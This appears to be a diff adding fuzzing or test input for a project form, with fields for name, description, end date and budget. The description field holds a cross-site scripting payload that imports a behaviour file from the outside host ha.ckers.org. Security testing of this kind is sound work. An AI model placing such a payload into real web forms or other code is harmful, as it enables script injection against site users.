@@ -1,0 +1,6 @@
+name : nLv:W'.sz1.l' F'
+desc : <html xmlns:xss><?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html>
+end : 19.7.2016
+budget : 1,667
+assignto[] : 1
+assignme : 1
